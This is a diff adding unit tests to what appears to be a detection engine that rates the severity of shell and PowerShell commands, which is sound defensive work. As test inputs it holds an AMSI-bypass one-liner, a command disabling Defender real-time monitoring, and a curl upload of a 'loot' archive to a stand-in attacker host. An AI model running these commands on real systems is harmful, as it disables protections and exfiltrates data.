@@ -280,3 +280,49 @@ def test_real_droppers_still_malicious():
     ):
         v = compute_verdict(classify(cmd, []))
         assert v["severity"] == "malicious", (cmd, v)
+
+
+# ── P0: lone high-confidence defense_evasion is malicious, not just suspicious ─
+
+def test_lone_amsi_patch_is_malicious():
+    cmd = "powershell -c \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\""
+    v = compute_verdict(classify(cmd, []))
+    assert v["severity"] == "malicious", v
+
+
+def test_lone_defender_disable_is_malicious():
+    cmd = "Set-MpPreference -DisableRealtimeMonitoring $true"
+    v = compute_verdict(classify(cmd, []))
+    assert v["severity"] == "malicious", v
+
+
+# ── P1: two benign-but-medium admin classes don't earn the multi-stage bonus ──
+
+def test_benign_admin_medium_combo_not_malicious():
+    # Enter-PSSession (lateral, medium) + schtasks /create (c2, medium):
+    # routine admin. With medium counted at half, no correlation bonus → not malicious.
+    cmd = 'Enter-PSSession -ComputerName SRV01; schtasks /create /tn Job /tr task.bat /sc daily'
+    v = compute_verdict(classify(cmd, []))
+    assert v["severity"] in ("low", "notable", "suspicious"), v
+    assert v["severity"] != "malicious", v
+
+
+# ── P2: file upload fires standalone; bare POST needs corroboration ───────────
+
+def test_curl_file_upload_is_exfil():
+    cmd = 'curl -X POST https://evil.xyz/u -F "file=@C:\\Temp\\loot.zip"'
+    classes = {c.name for c in classify(cmd, [])}
+    assert "data_staging" in classes
+
+
+def test_curl_bare_post_to_api_not_flagged():
+    cmd = "curl -X POST https://api.internal/v1/events -d '{\"event\":\"login\"}'"
+    classes = {c.name for c in classify(cmd, [])}
+    assert "data_staging" not in classes
+
+
+# ── P3a: help/version queries on medium recon rules are suppressed ────────────
+
+def test_nmap_help_not_recon():
+    assert classify("nmap --help", []) == []
+    assert classify("nltest /?", []) == []
